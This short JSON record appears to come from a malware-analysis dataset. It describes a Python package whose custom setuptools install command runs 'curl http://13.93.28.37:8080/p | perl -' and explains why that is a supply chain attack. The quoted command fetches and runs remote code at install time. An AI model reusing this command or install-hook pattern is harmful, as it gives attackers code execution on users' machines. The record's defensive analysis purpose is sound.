      "malicious_behavior": "The code defines a custom install command class for setuptools that overrides the run() method to execute a shell command during package installation. Specifically, it runs a subprocess with the command 'curl http://13.93.28.37:8080/p | perl -' using shell=True. This command fetches a script from a hardcoded, suspicious IP address and pipes it directly to the Perl interpreter for execution without any user interaction, validation, or consent. This pattern is a classic supply chain attack vector enabling remote code execution at install time, which is strongly associated with malware. The use of a hardcoded IP address instead of a domain, the lack of error handling, the execution of downloaded code during installation, and the absence of legitimate application logic around this network activity all indicate malicious intent."
